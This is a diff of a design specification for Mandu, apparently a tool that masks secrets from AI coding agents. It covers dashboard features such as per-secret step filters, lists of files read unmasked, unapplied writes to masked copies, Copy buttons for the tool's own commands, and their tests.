+  | Settings › About Mandu, the setup line (index.html `code[data-run]`; #193) | `mandu doctor` | "Copy mandu doctor" |
+  | Settings › About Mandu's Version row with no version known (`renderAbout`; #193) | `mandu --version` | "Copy mandu --version" |
+  | Settings › Protection, a dashboard started without the service controls (`drawServices`; #193) | `mandu dashboard` | "Copy mandu dashboard" |
+  | Home › Where your data lives: its line (index.html `code[data-run]`), the open-places note and the list that could not load (`renderDataLocations`, `loadDataLocations`; #193) | `mandu paths` | "Copy mandu paths" |
+  | The page's own sentences that mark their command `'run'` (`ownWords`, drawn by `words()`; #193): an answer this dashboard cannot pass on (`ADMIN_CHANNEL_WORDS`), the sign-in sentence (`SIGN_IN_WORDS`), a session record it could not check (`UNCHECKED_SECRETS_WORDS`, `UNCHECKED_REST_WORDS`), Describe's helper not installed | `mandu stop`, `mandu dashboard --set-password`, `mandu doctor` | "Copy mandu stop", … |
+
+  A screen reader thus never hears five bare "Copy" buttons on Home; the
+  reply's block keeps the bare "Copy" (its block is its context).
+
+  *The Plugins page and Home's OpenClaw fixes (2026-10-28, Shoemaker run
+  2026-10-28-0730, queue #147).* The Plugins page (§4.25aj) shipped after
+  #118 was specced, so the page that is almost all commands, and Home's
+  two cards about an attached OpenClaw, had bare codes; the lost-route
+  card is the one that says the AI may read your secrets as they are once
+  the Gateway restarts, so its fix should be the easiest thing on the page
+  to run. The last four rows above came then: the set-up's steps go
+  through `runCode`, and the server marks the other three lists' commands
+  `run` (`plugins.ts`'s `run()` for the stopped line's two, and every
+  command part of `PLUGIN_EXPOSURE_FIX` and `ROUTE_FIX_PARTS`, fixed
+  strings). Nothing else on the Plugins page has a Copy: not the agent
+  or session names on a card, not a route problem's words, not the
+  covers line's `mandu openclaw gateway` (it names the confined form, it
+  does not ask you to run it), and, for now, not a stopped card's own
+  `mandu serve start` (the line above it has the same command with its
+  Copy) nor a down card's `mandu serve status`. On Home the exposure
+  card's launch flags (`--mode off`, `--no-net-guard`) and the route
+  card's session id and config path stay plain codes. Copying
+  `mandu openclaw install` or `uninstall` changes nothing: the person
+  still runs it in their own terminal.
+
+  **Only Mandu's own commands.** No Copy on a host, a file, a key name, a
+  command the AI ran or anything from a session's events: the helper is
+  called from the places above only, and a test pins the list. Where a
+  server sentence carries the command as a code part, the server marks it
+  (`{ kind: "code", text, run: true }`: last-scan.ts's two `againParts`,
+  home.ts `agentNoticeParts` for the code part equal to the session's
+  own log command, and since #147 the Plugins and OpenClaw lists above),
+  so the page never guesses from the text. The page's own sentences do the
+  same (#193): an `ownWords` part given as `['mandu stop', 'run']` is drawn
+  with `runCode`, one given as `['…']` with `ownCode`; the mark is not in
+  the sentence's text, which stays the map key `words()` looks up, so the
+  sentence draws the same either way. What stays a bare code, and why:
+  the scan card's sentence that only names `mandu scan` (it names it, the
+  again line below asks), History's older-server fallback for the same,
+  the start-your-agent `mandu claude` / `mandu codex` of a sentence (the
+  first-run card has them with their Copy), Settings › About's
+  `update-check = false` / `update-check = true` (config lines, not
+  commands), any code naming a file, a host, a key or a flag, a server
+  sentence sent as one string (`home.ts`'s reply-filter notice) or whose
+  code part the server does not mark (the notice's `mandu doctor`), and
+  every command the AI ran. None of these commands
+  holds a secret (the Plugins and OpenClaw ones are fixed strings). The update line is built only from a parsed semver and the fixed
+  release repository (update-notice.ts), and the log command only from the
+  session's id, never from text a session controls. A poll that draws a
+  card again gives the focus to the Copy drawn at its place, as it does for
+  the reply's (`readsAs`); every one of these sections is also drawn again
+  only when its answer changed (`sameAsDrawn`).
+  Tests for #147: `plugins.test.ts`, `human-plane.test.ts` and
+  `attachment-route.test.ts` (exactly the commands marked, in every card
+  state; no name, flag, path or problem), `home-js-plugins.test.ts` and
+  `home-js-command-copy.test.ts` (jsdom, a stubbed clipboard: the set-up,
+  the stopped line, a notice, a lost route, Home's exposure and lost-route
+  cards each copy exactly their commands; the names stay plain; the
+  callers, now six, and the marks pinned), and
+  `tests/stack/plugins-page.test.ts` P6 (the real arbiter and dashboard:
+  `/api/plugins` and `/api/home` carry the marks on exactly those parts).
+  *The rest of what the page asks you to run (2026-10-29, Shoemaker run
+  2026-10-29-0130, queue #193).* `mandu doctor`, `mandu dashboard`,
+  `mandu paths`, `mandu stop` and `mandu --version` were what a person is
+  told to run when something is wrong, and were still bare codes; the
+  last five rows above came then. Tests for #193:
+  `home-js-command-copy.test.ts` (each place copies exactly its command,
+  is named for it, and reads as before with Copy after the command; no
+  clipboard, the bare code and the same words; `update-check = true` has
+  none; the callers, now eleven, the own-words marks and index.html's
+  `data-run` codes pinned) and `tests/stack/product-command-copy.test.ts`
+  C4 (the served Settings of a real dashboard started without the service
+  controls: About's `mandu doctor` and Protection's `mandu dashboard` each
+  copy exactly the command; Home's count gains `mandu paths` and About's
+  `mandu doctor`).
+  Tests: `home-js-command-copy.test.ts` (jsdom, a stubbed clipboard: each
+  place writes exactly its command, the update line in full and the log
+  command with its id; the names; no button without a clipboard; the focus
+  across a poll; no Copy for a sentence's code, the notice's `mandu doctor`
+  or the reply; print; the pinned callers and server marks),
+  `last-scan.test.ts` and `home-view-model.test.ts` (the marks, and only
+  them), and `tests/stack/product-command-copy.test.ts` (a real arbiter at
+  the `secrets` axes with a labelled `.env`, the launcher's update cache,
+  the real dashboard; the served Home and Settings with no session: every
+  Copy writes one of the expected commands; then a session whose two
+  commands could not start, through the real proxy: its page's one Copy
+  writes `mandu log <id>`; the oracle: no Copy on a value, a chip or a
+  token, the clipboard and the model never get the value).
 
 **Security property: secrets at any depth.** (What the page CARRIES; a
 signed-in click can still ask for one secret's value, *Showing a real value*
@@ -11201,7 +14686,9 @@ screenshots had to be redacted) shows placeholders until someone clicks.
   no protection service is 501; a token the arbiter no longer holds is
   404. The value goes back in the answer only, never in a log line
   ("showed one secret value of session …"). Mirrors
-  `/api/prompt-filters/reveal`'s scoping (§4.25y).
+  `/api/prompt-filters/reveal`'s scoping (§4.25y). One exception since
+  2026-10-25: an attachment session's own claimed records (§4.25aj *A
+  plugin session's page*, `event-model.ts revealScopeEvents`).
 - *The page.* `home.js secretValueBox`: the value lands as text in a
   `<pre>` with "Only you see this. The AI still has only the masked
   version. Hides again in 1 minute."; "Hide it again" empties the box, so
@@ -11345,6 +14832,329 @@ through the real arbiter and proxy, the real dashboard signed in, the served
 page in jsdom; the card links `/rules?file=~/mandu-try/.env`, following it (and
 opening that address) opens the file's row with the focus on its ⋯ and the
 address at `/rules`, and no page, address or answer carries the key's value.
+
+**A card finds its other sessions (2026-11-04, queue #250).** *Show its
+steps* covers this session only. To see whether the same `.env` came up in
+yesterday's session too, a person opened History and typed the path. Now a
+*Your secrets* card ends its link line (*Change it in Rules*, *Show its
+steps*) with **Its other sessions**, a plain link to History searched for
+what the card names (`home.js secretHistoryQuery`):
+
+- a card with a file (`file`): its path as the card names it, `~/…`
+  (`/history?q=~%2Fproj%2F.env`), the words History's search finds the card
+  by (§4.25ae *By a secret or a host*);
+- else a card for a key (an environment variable, a key in a file the page
+  could not place): its name (`StorySecret.key`, `secret-story.ts keyOf`,
+  the first code part of the card's words, only on a card with no `file`);
+- else none: a step's output, a variable with no name, a secret item.
+
+It is named by what it searches for ("Its other sessions: ~/proj/.env"),
+its `data-land` "q:<words>" opens History with the box filled, a new tab
+and a bookmark work, and Back returns to the session page where you were.
+History lists this session too. The words say "its other sessions", not
+"every session": the search matches words, so `~/app/.env` also finds
+`~/app/.env.local`. The row's gap (`.secret-card > .secret-rule`, #247)
+spaces it from the button, and the line wraps on a phone. A name or a
+path, never a value. Tests: unit `secret-story.test.ts` (`key` on a
+variable's card and an unplaced key's, none on a file's or an output's),
+jsdom `home-js-secret-steps.test.ts` C8 (the link, its query and name on a
+file's card, a key's card searched by the key, none on a card with
+neither), and stack `tests/stack/rule-its-sessions.test.ts` (the tour's
+card and its Rules rule over a real arbiter: each link opens History with
+the box holding the path and the tour listed, and no page or answer holds
+the value or a `$MDU:` token).
+
+**A card shows its steps (2026-10-30, queue #179).** A *Your secrets* card
+counts what happened to its secret ("Mandu blocked 3 attempts to send it …",
+"sent its real value … (4 requests)"), but its times link one step each:
+the first send, each host's first block. To see the others of that key a
+person read every turn, and *Only where Mandu stepped in* (§4.25ae) keeps
+every turn where Mandu masked any secret, which with two secrets is most of
+them. Now:
+
+- **What counts as a step of a secret** (`secret-story.ts secretSteps`, one
+  place, server side). A step of the page whose event names one of the
+  card's tokens and is: the secret coming in masked (its mint, and any
+  later tool result that held it, `heldTokens`, never one the call only
+  echoed); the AI writing its placeholder into a call (the lineage's
+  `echoed` edge); a check of a use of it (a `gated` or `egress` edge: a send
+  or a stopped action, allowed, blocked or waiting); its real value filled
+  in (every `desymbolize` naming it but the reply filter's); a read of it
+  before its label (dual-lanes `maskedLater`, a later label's reads). Never
+  a model request that only carried the placeholder (`tllm_call`,
+  `entered_context`), which would keep every later turn. An event is placed
+  by the trace's rule (dual-lanes `stepIdOfEvent`): one no step shows (no
+  `callId`, no `os:` step) is not counted, so the words claim only what
+  Mandu found.
+- **What the page gets.** `buildAgentPage` gives `pageSecrets` every action
+  step of every turn with its turn (`turnOf`, story order) and the drawn
+  turns (`drawn`). Each card then carries `steps` (ids, story order, at most
+  `SECRET_STEPS_CAP` = 200, `stepsMore` past it), `turns` (the drawn turns
+  that hold one, from every step, so a step past its turn's step cap still
+  keeps its turn) and `earlierTurns` (turns older than the drawn ones that
+  hold one, counted as turns, never as steps). Ids only: no token, no value.
+  Home's call gives no turns and gets none.
+- **The button.** A card with steps has **Show its steps** beside *Change it
+  in Rules* (`.secret-steps`, described by the card's name). The link and the
+  button sit on one wrapping row, 16 px apart and 8 px between rows when it
+  wraps (`.secret-card > .secret-rule`, a flex row with no text between
+  them; 2026-11-04, queue #247: a bare space had left them 3 px apart, so a
+  thumb on the link's end pressed the button); a card with one of the two
+  holds it alone, and the Scan page's link (`.scan-rule`) is not a card's
+  row. A press keeps
+  the turns that hold its steps: each run of the others folds behind one
+  line in its place, as the switch's quiet runs do ("3 turns where Mandu
+  found no step of this secret", with its own *Show them*; never "did not
+  use it", which the mapping cannot back), and its steps are marked
+  (`.step.shown`, as *A time opens its step* marks one). A line above the
+  story (`#agent-secret-only`, a `.story-more`) says "Showing the 4 turns
+  where Mandu found a step of the environment variable `STRIPE_KEY`.", the
+  card's own name, and has **Show every turn**; it takes the focus, and a
+  polite status (`#agent-story-status`) says the same. With steps in
+  earlier turns it adds "2 earlier turns not shown here have one too." and
+  a *Show them* that asks for every turn and comes back to the line
+  (`landAgent` kind `secret`); past what the page shows, the words alone.
+  With no drawn turn holding one: "Mandu found no step of … in the turns
+  shown here." The card's button reads *Show every turn* while its filter
+  is on; a press on another card moves the filter there.
+- **How it composes with the switch.** The filter takes the switch's place
+  while it is on (one fold function, `foldQuiet`, with two reasons; a
+  folded turn is `.folded` either way, so `quietButton`, `openQuiet`,
+  Find in page and a card's time work for both). *Show every turn* (the
+  line's, the focus then to the card's button, or the card's own, the
+  focus staying on it) puts the story back with the switch's own state.
+  Turning the switch on or off ends the filter.
+- **For this visit only.** The filter is page state (`S.agentSecretOnly`,
+  by visit, session and the card's level and name): not in the address,
+  gone on reload or on leaving the page. A poll that draws the page again
+  keeps it, with the runs you opened; a card gone, or with no step now,
+  ends it. A time on a card keeps the filter's marks and opens its run.
+- **Step by step (2026-10-30, queue #244).** A turn holds many steps, some
+  in a folded run (*Show N more steps*), so finding "the send that was
+  blocked" among the marked rows still meant scrolling every kept turn.
+  With two or more of the card's steps drawn, the line has **Previous
+  step** and **Next step** (`.secret-prev`, `.secret-next`, before *Show
+  every turn*; never `.show-rest`, which `goToTurn` reads). A press
+  (`goToSecretStep`) goes to the drawn step after (before) the one the last
+  press went to, in page order, after the last the first, through
+  `showStep` (its run of steps opened, focused, scrolled to the centre), as
+  the count tiles step through theirs. The count is the steps the story
+  draws now (`[data-step-id]` whose id is in the card's `steps`, compared as
+  values): a step in a turn not drawn is skipped and not counted (the
+  line's "earlier turns" words and *Show them* cover those, and the count
+  grows once they are drawn). The step it went to gets `.secret-at`, an
+  outline in `--accent` on top of the filter's bar (kept while it has the
+  focus), on one row only; the line says "Step 2 of 7" (`.secret-where`,
+  nothing before the first press) and the polite status says the same on
+  each press. The place is the filter's (`S.agentSecretOnly.at`): a poll
+  that draws the page again keeps it while its step is drawn, else drops
+  it; *Show every turn*, another card's *Show its steps* and the switch end
+  it with the filter. A print drops the line with the controls and the
+  outline with it.
+- **Print** prints every turn: `printOpen` opens the filter's folded runs
+  and `printClose` folds them again (the switch's quiet runs keep #91's
+  rule, *A printed session is whole*, above); the line above the story is dropped with the controls.
+
+Read-only display: no route, no write, nothing about what is masked or sent
+changes. Tests: `test/unit/view-model/secret-story.test.ts` (a card's
+steps: the mint, the call it was written into, the sends allowed and
+blocked, a fill, in story order; never a model request or the reply
+filter's reveal; another secret's steps not in it; the cap and `stepsMore`
+with every turn still counted; drawn turns and `earlierTurns`; ids only;
+none on Home), `agent-page.test.ts` (a file labelled after the session has
+its reads; a turn past `TURN_CAP` counted in `earlierTurns`),
+`test/unit/ui/home-js-secret-steps.test.ts` (jsdom: the button only with
+steps; the fold, the marks, the line, the focus and the status; *Show every
+turn* and the switch each restore the story, the switch's folds given
+back; the earlier turns' words and *Show them*; a poll keeping the filter
+and an opened run; Find in page and a card's time opening a run; print;
+not in the address; C6/C7, step by step: Next and Previous wrapping, the
+fold opened, one `.secret-at`, "Step 2 of 3" on the line and in the status,
+a step not drawn skipped, no buttons with one drawn step, the place kept
+or dropped by a poll and ended with the filter), and the stack e2e
+`tests/stack/session-page-secret-steps.test.ts` (two secret files labelled
+in policy.yaml, through the real arbiter, anthropic-proxy and net-proxy, one
+sent to its bound host and blocked at another, the other only masked; on
+the served page the first card's *Show its steps* leaves exactly the turns
+of its read, send and block; no page carries either value; K4, in a real
+headless Chromium, *Next step* twice focuses the card's second drawn step,
+inside the viewport and the only one outlined; K5, at 1280 and 390 px, each
+card's link and button at least 8 px apart or wrapped, both still working),
+with `test/unit/ui/css-secret-rule-gap.test.ts` (the row's flex and gap in
+the stylesheet, only the card's; no text node between the two).
+
+**Files the AI read as they were (2026-10-23).** *Your secrets* ended with
+"Mandu protects only the secrets you registered and the files you labeled.
+Anything else the AI read, it saw as it was." It did not say which files
+those were: a Read step names only the file's base name, with no note, among
+dozens of steps, and only a *protected* file's card linked to Rules (*A card
+opens its file in Rules*, above). The file a person most needs to act on
+after reading the session had no way there. Now, under the limits line, a
+fold **"Files the AI read as they were (14)"**:
+
+- **What it lists.** Each file the agent's read tool opened (any agent's:
+  the `read` family of `tool-family.ts`) whose result reached the AI with
+  nothing masked (`later-labels.ts plainReads`: no mask, no stop, no hold,
+  not sandboxed, a non-empty result with no placeholder) and whose step the
+  story tells as `plain`, so a read marked a secret after it (`raw`, either
+  way *Labelled after the session* learns it) is never one. Over every turn,
+  not only the turns shown (`agent-page.ts readAsIs`, `AgentPageVM.readAsIs`).
+  One row a file, by its first such read, in that order, written `~/…`
+  under the home folder, else absolute (placed as a Read's path is,
+  `readStepPath`; a path that could not be placed or that holds a
+  placeholder is left out).
+- **Past 30 files (2026-10-26).** The fold lists the first 30
+  (`home.js READ_AS_IS_SHOWN`); when there are more, its last line reads
+  "12 more files." with **Show them** (*Show it* for one), the control
+  Home's *Earlier* uses for its rest (`showRest`, §4.25ad). Pressing it
+  draws the rest in place, and the focus goes to the first file it brought
+  (`landOn`). The rest stays shown while the page redraws (a running
+  session's poll keeps the focus where it was, `pollRefocus`) until you
+  leave the session: `S.readAsIsAll` holds the visit it was shown in, as
+  `S.earlierAll` does for Earlier, so a new visit starts at 30 again. Until
+  then (2026-10-23 to 2026-10-26) the list stopped at 30 with a dim "and 12
+  more files" that led nowhere, and the files a long session read *later*,
+  often the config and deploy files, could not be seen or protected from
+  here. The server sends up to `READ_AS_IS_CAP` (300) files, paths and
+  times only, so the page's answer on each poll stays small; past them the
+  last line stays a count, "and 50 more files. Search the steps below for
+  the rest.", drawn once every file sent is shown.
+- **A row.** The path (breaking at its slashes, as a card's file does), "read
+  at" its first read's time, which opens that step where the story draws it
+  (its `step`, the button of *A time opens its step*; a time alone
+  otherwise), and **Protect it**, a plain link to `/rules?file=<path>` named
+  "Protect `~/…` in Rules", which opens *Add a rule*'s file browser at the
+  file as a card's link does. The link changes nothing by itself: the person
+  picks the label with Rules' own menus and Save.
+- **When there is none.** No fold without such a read, and none in a session
+  with protection off, where the limits line already says Mandu masked
+  nothing. Its intro says what it cannot see: "Files your agent opened with
+  its read tool. A file a command printed is not listed." (a `cat` in a
+  command is not a file read Mandu can name).
+- **A fold.** A `<details>` in `index.html` (`#agent-read-as-is`), closed on
+  load and on each new visit; a redraw of the same page (a running session's
+  poll) keeps it as you left it (`home.js renderReadAsIs`). A coding session
+  can read hundreds of files: the list stays out of the way until asked for.
+- **Never a value.** Paths and times only, never a byte of the file. A path
+  is what the agent's own call named; the steps already show its base name.
+
+Tests: `test/unit/view-model/agent-page.test.ts` (two reads of one file and
+one of another are two rows in first-read order; any agent's read tool; a
+relative path placed in the session's folder; `~/…` under home; a masked,
+later-labelled, blocked, held or sandboxed read, a Bash `cat` and a path with
+a placeholder are not listed; 40 all sent, past `READ_AS_IS_CAP` (300)
+counted in `more`; a read past what the
+turn draws has no `step`; `mode: off` and no read give null),
+`test/unit/ui/home-js-agent.test.ts` (the fold's count, rows, *Protect it*'s
+`href` and name, a time that opens its step, past the server's cap "and 12
+more files. Search the steps below for the rest." with no button, no fold
+without a list, open across a redraw and closed on a new visit; following
+*Protect it* opens the file's row; with 42 files 30 rows and "12 more
+files." with *Show them*, which draws all 42, each with *Protect it*, the
+focus on the 31st, kept through a poll that redraws the page, 30 again on a
+new visit, *Show it* for one, nothing POSTed), and the stack e2e
+`tests/stack/session-page-read-as-is.test.ts`: through the real arbiter and
+proxy and the real dashboard signed in, a session Reads a registered `.env`'s
+twin and an unlabelled `notes.txt`; the page lists `notes.txt` only, *Protect
+it* opens its row in Rules with the focus on its ⋯, the fold holds no line of
+`notes.txt` and adds none to the page, and no page, address or answer
+carries the key's value. A second session there Reads the twin and 35
+unlabelled files: the page's answer sends all 35, the fold draws 30 and
+"5 more files." with *Show them*, pressed all 35 with the focus on the
+31st, and the 35th row's *Protect it* opens that file's row in Rules; no
+row or answer carries a line of a file, `.env` is never listed, and no rule
+changed.
+
+**Changes Mandu did not apply to your files (2026-10-29).** The agent works
+on masked copies of the registered secret files (the twins). A write to one
+lands in the copy, which goes with the session, and Mandu never copies it
+back (confidentiality-plan-10-flow-taint.md §4.1). So "I added
+`STRIPE_WEBHOOK_SECRET` to `.env`" left `.env` as it was, and a person
+learned it when their program failed. The launcher printed one line per file
+at exit, after a full-screen agent had closed, and recorded the paths on
+`session_exit` (`discardedWrites`), which only the developer view read. Now
+an ended session's page has a block after *Your secrets*:
+
+> **Changes Mandu did not apply to your files**
+> The agent works on masked copies of your secret files. What it wrote to
+> these went to the copy, and Mandu did not apply it to the real file. If you
+> want the change, check the file and make it yourself.
+> - `~/app/.env`
+
+- **What it lists.** The paths of the session's last *believed*
+  `session_exit` from the launcher (`believedEvents`; `view-model/discarded-writes.ts`
+  `discardedWritesOf`, `AgentPageVM.discardedWrites`). A claim, sent from
+  the agent's own tree over the data socket (arbiter-human-plane.md §10.2),
+  never lists a file, nor replaces the believed exit's list. Entries that are
+  not a non-empty string are dropped, and the same path twice is one row.
+- **How a path reads.** `~/…` under the dashboard's home, else absolute
+  (`tildePath`), with its control and format characters as `?`, as the
+  launcher's `printablePath` writes them, so a folder name cannot reorder the
+  line. Each is code that breaks at its slashes (`home.js longName`).
+- **The cap.** At most `DISCARDED_CAP` (20) paths, then "and 5 more files.".
+- **When there is none.** No block while the session runs (a session
+  resumed after its exit runs again), when its exit names no file, or on a
+  page that could not be read or found (`home.js renderDiscardedWrites`).
+- **What it may not claim.** The event holds paths only, not what became of
+  the real file. The real file may still have changed some other way: a hard
+  link made before the launch, a reader the guard handed the real file, or
+  the person's own edit (the launcher's terminal notice checks this, the
+  event does not record it). So the words say only that Mandu did not apply
+  the change, never that the real file is unchanged, and they ask the person
+  to check the file first. They say "masked copy", never "placeholder".
+- **Signed out and printed.** The signed-out projection keeps paths (§6), as
+  *Files the AI read as they were* shows them, so the block is the same
+  signed out. It is a plain block, so the printed page has it.
+- **Home and History say so (2026-10-31, Shoemaker #266).** Only the
+  session's own page listed them, so a person who did not open it learned
+  of the lost change when their program failed. Now the session's facts
+  (`HomeSessionFacts.notApplied`, `home-routes.ts derive`) count the files
+  of the same believed exit (`discardedWritesOf`, `files.length + more`;
+  a claim never raises it), and its row (`homeAgentRow`) carries
+  `notApplied` only when it is above 0 and the row has ended
+  (`state === "idle"`), as the page hides the block while the session runs.
+  Home's *Earlier* rows and History's ended rows say "changes to 1 file not
+  applied" ("changes to 3 files not applied") after their counts and before
+  a question still waiting, the number kept with its word (`countWords`), and
+  have the amber dot (`rowWarn`). The words link the session's page at the
+  block (`notAppliedLink`, `/agents/<id>?go=not-applied`, *A link that goes
+  where a tile goes*). The row holds the count only, never a path; the
+  route is open signed out (metadata and counts). History's *Only sessions
+  where Mandu stepped in* keeps such a session (`historyFlagged`), and Home's
+  "Mandu last stepped in" line (`steppedIn`) does not name it.
+
+Tests: `test/unit/view-model/discarded-writes.test.ts` (no exit, no field
+or an empty list give null; the last of two exits by time; a claimed exit or
+another emitter's lists nothing and does not replace the believed one;
+non-string, empty and repeated entries; `~/…` under home; U+202E, U+2028, a
+newline, an escape and U+200B as `?`; 25 paths give 20 and `more: 5`; on the
+page model signed in and out, and null while the session runs),
+`test/unit/ui/home-js-agent.test.ts` (the block after *Your secrets*, its
+heading, intro, codes breaking at slashes and the count; hidden with no
+files, on "Session not found" and from a server without the field),
+`test/component/agent-page-launch-time.test.ts` (the real server over a
+`FileEventSource`: `~/app/.env` signed in and out, nothing from the same
+event as a claim), and the stack e2e `tests/stack/discarded-writes-page.test.ts`:
+a real arbiter in `secrets`, the real proxy and the real dashboard; a session
+Reads a registered `.env` holding a fake key, the launcher's real
+`sessionExitEvent` goes over the human socket, and the page lists
+`~/app/.env` signed in and out; a later exit on the data socket is stored
+claimed and changes nothing; a second session whose believed exit names no
+file and whose claimed one names `.env` shows no block; neither the model,
+the block, the page's answers nor the served page carries the key. The rows
+(2026-10-31): `test/unit/view-model/home-view-model.test.ts` (`notApplied`
+from a believed exit, distinct files counted, none from a claim, no field
+or an empty list; only on an ended row and only above 0; `historyFlagged`
+keeps it, `steppedIn` does not), `test/unit/ui/home-js-home.test.ts` and
+`home-js-history-waiting.test.ts` W4 (the words, their order, the amber
+dot, the link's address; an older server's row unchanged; the poll draws
+the count), `test/unit/ui/home-js-agent.test.ts` (`?go=not-applied`
+focuses the block's heading; hidden, nothing moves; Earlier's link pressed
+lands there), `test/component/history-stepped-in.test.ts` (the real server
+over a `FileEventSource`: Home's and History's rows `notApplied: 1`, none
+from the claim, no path, the switch keeps it) and the stack e2e's D5
+(`/api/home` and `/api/home/history`, signed in and out, carry the count and
+never the path).
 
 **Show the real value keeps the focus (2026-10-14).** *Show the real
 value* goes off while it asks the server for the value
@@ -11508,12 +15318,12 @@ staging.conf" twice, "2 requests" and "1 request". A merged entry counts
 each model request that carried any of its tokens once. Each line follows
 from a recorded event:
 
-- **The AI**: "The AI got only a placeholder, never the real value (it went
+- **The AI**: "The AI got only its masked version, never the real value (it went
   to the AI that way in N requests)", for a `no-model` or unknown level only.
   A secret the AI read as it was before it was labelled (a dual-lanes
   `maskedLater` step whose tokens are the entry's) never claims that: "The
   AI read its real value at `<time>`, before it was marked a secret. From
-  `<time>` on it got a placeholder in its place, in N requests." (amber;
+  `<time>` on the AI got it masked, in N requests." (amber;
   2026-10-05, the tour's `deploy/staging.conf`, which the page said had never
   reached the AI). When later requests carried it (N > 0), a second amber
   line follows: "Anything the AI wrote from its real value went back to the
@@ -11554,15 +15364,15 @@ from a recorded event:
   below). "only" is said when no other release was recorded (an
   egress-queue approval, a non-reply `desymbolize`, each its own line); with
   none at all, "Mandu did not fill in its real value for any request off this
-  machine" (not in Off).
+  computer" (not in Off).
 - **What Mandu stopped**: each `blocked` send that withheld it, by host
-  ("The request never left this machine", the net-proxy's 403 path), egress
+  ("The request never left this computer", the net-proxy's 403 path), egress
   refusals, the OS gates that stopped a call that used it, and the steps
   still waiting for an OK. A block or a stopped action that filed an
   Approvals row says so ("…, and asked for your OK in Approvals", *A block
   says Mandu asked you* below).
 - **Where you saw it**: a reply-filter `desymbolize` that resolved it ("You
-  saw its real value in the agent's reply. The AI kept the placeholder.").
+  saw its real value in the agent's reply. The AI kept the masked version.").
 
 **In the order it happened** (2026-10-05). The tour's `STRIPE_KEY` card
 read "Mandu sent its real value only to `api.stripe.com` (1 request), where
@@ -11574,8 +15384,8 @@ it go there) and the send a minute later, after the person allowed it once.
 Now the send line and each block line say when, from the events that prove
 their lineage edges, as a `time` part the page draws as the viewer's clock:
 "(1 request, at 10:39)", "…to `api.stripe.com`, at 10:38. The request never
-left this machine."; for more than one, "the first at" ("None of them left
-this machine" after N attempts). The send line and the block lines run in
+left this computer."; for more than one, "the first at" ("None of them left
+this computer" after N attempts). The send line and the block lines run in
 time order (a tie keeps the send first). Without a send, the block lines
 keep their place after "did not fill in", in time order among themselves.
 A time the record does not hold (an event missing, a time that cannot be
@@ -11586,7 +15396,7 @@ and the session route has no answered asks.
 
 **A block says Mandu asked you** (2026-10-06). The tour's `STRIPE_KEY` card
 read "Mandu blocked 1 attempt to send it to `api.stripe.com`, at 10:38. The
-request never left this machine." and then "Mandu sent its real value only
+request never left this computer." and then "Mandu sent its real value only
 to `api.stripe.com` (1 request, at 10:39), where it is allowed to go". A
 first-time reader saw the same host blocked and then allowed a minute
 later, with nothing between. The 10:38 step under *What happened* already
@@ -11596,9 +15406,9 @@ you*), and the block's `net_action` records the row (`policy.approvalId`,
 
 - **The words.** A block line whose blocks filed a row reads "Mandu blocked
   1 attempt to send it to `api.stripe.com`, at 10:38, and asked for your OK
-  in Approvals. The request never left this machine." When only some of a
+  in Approvals. The request never left this computer." When only some of a
   host's blocks filed one: "…, the first at 10:01, and asked for your OK in
-  Approvals for 2 of them. None of them left this machine." The stopped
+  Approvals for 2 of them. None of them left this computer." The stopped
   actions line does the same ("Mandu stopped 1 action that used it, and
   asked for your OK in Approvals.").
 - **Which row.** Each lineage edge's own evidence event (`eventId`: the
@@ -11629,7 +15439,7 @@ for one request. So the line now says "…, where it was allowed to go", in the
 past: it is true of both, and it claims neither. It names no OK either,
 since the card never says that you answered (*A block says Mandu asked you*).
 The same pass makes one request read as one. The turn's banner used to say
-"1 request left this machine with your secret `STRIPE_KEY` filled in, each
+"1 request left this computer with your secret `STRIPE_KEY` filled in, each
 to a destination allowed to receive it." It now says "…filled in, to a
 destination allowed to receive it." ("each" stays for two or more, see
 *The summary names the secrets*). The title of the sends tile on the page,
@@ -11698,7 +15508,7 @@ it.") and in a session whose leak check fired. Now:
   and red (`unmasked`) for a fired leak check. An answer the page does not
   know (none sent, or an unknown word) draws the tag neutral, never green.
 - **Since when.** An `early` card also carries `since`, the moment its
-  first line says the AI got a placeholder from (`ReadBeforeLabel.maskedTs`,
+  first line says the AI got it masked from (`ReadBeforeLabel.maskedTs`,
   the first request that carried it masked). The tag reads "Secret, hidden
   from the AI since 10:42", drawn as a `<time>` in the viewer's clock. It
   is not a link: a model request is not a step (*A time opens its step*).
@@ -11713,6 +15523,21 @@ The claims read only the BELIEVED events (`believedVm`, the route's
 secrets you registered and the files you labeled; in Secrets mode, it does not
 stop prompt injection (protection-modes.md); in Off, it only watched. With no
 secret recorded the block says so in one line.
+
+**The page says protection was off** (2026-10-26, nightly #125). Until then
+the limits line under the cards was the only place a session that ran in
+Off said so; the head of the page and the tiles looked like a protected
+session's. Now `AgentPageVM.protectionOff` (`paired.mode === "off"`, the
+recorded mode, as its row's) draws one amber line at the top, in its own
+element `#agent-off` (`.posture-line`, a note) just above `#agent-posture`,
+which a session can show at the same time: "Protection was off in this
+session: Mandu only watched. Your secrets were not guarded and nothing was
+masked." While protection is off now too (Home's `protection.level`), it
+ends with "Protection is in Settings", a link to Settings › Protection;
+once it is back on there is nothing there to do, and the link goes. The
+line follows each poll even when the page is not drawn again, and is drawn
+again only when it changes, so a focused link keeps its focus. The grey
+limits line stays.
 
 **Tests.** `agent-page.test.ts` (sentences, the outcome ladder, `osSentence`,
 one-level reveal with a nested secret and an unknown token, `revealValues`
@@ -11774,6 +15599,133 @@ per run; an ask opens its own fold), `app-js-dual-lanes.test.ts` (the row's
 words and tag, the rail's labels and marks) and `session-walkthrough.test.ts`
 (both front-ends over the real server).
 
+**Where it went (2026-10-28).** A session page told a secret's path one
+step at a time ("Secret hidden" on each step, "The result held your secret
+`ORDERHUB_PASSPHRASE`."), and the whole path was on the developer view only.
+Under the OpenClaw plugin it told even less: its record is unchecked
+(§4.25ah), so *Your secrets* showed no card at all. And a checked record of
+the same demo named its card "`ORDERHUB_PASSPHRASE` in `DEBUG=1 sh
+orders-app/bin/sync-orders.sh`", with *Change it in Rules* opening a file of
+that name: the twin's recorded origin is the command that printed it, not
+its file. Now (`view-model/secret-path.ts`, `secret-story.ts`):
+
+- **Where it is kept.** A registered secret's placeholder is named by the
+  file the arbiter's registry says it stands for (`confidentialityState`'s
+  `secrets`, read once a request with the label times, `label-times.ts
+  registeredFiles`): "`ORDERHUB_PASSPHRASE` in `~/app/.env`", the Rules link
+  to that file. A recorded origin that is a command or a web address (the
+  symbol's recorded tool, `originIsNoFile`) never names a file; with no
+  registry answer such a card reads "`ORDERHUB_PASSPHRASE` in a file" and
+  has no Rules link. Home counts with the same names (`HomeFacts`, its cache
